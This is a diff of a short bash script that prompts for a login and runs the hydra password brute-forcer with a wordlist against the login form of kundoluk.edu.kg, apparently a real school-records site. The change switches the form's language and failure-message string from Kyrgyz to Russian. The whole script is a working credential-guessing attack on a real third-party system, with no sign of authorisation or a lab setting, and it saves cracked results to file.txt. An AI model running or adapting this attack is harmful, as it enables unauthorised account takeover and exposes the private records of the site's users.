@@ -1,4 +1,4 @@
 #!/bin/bash
 echo "Enter Your Login"
 read login
-sudo hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ky&type=default:Ысымыңыз же сыр сөзүңүз туура эмес!" -vV -o file.txt
+sudo hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ru&type=default:Пользователя с такими данными не найдено." -vV -o file.txt
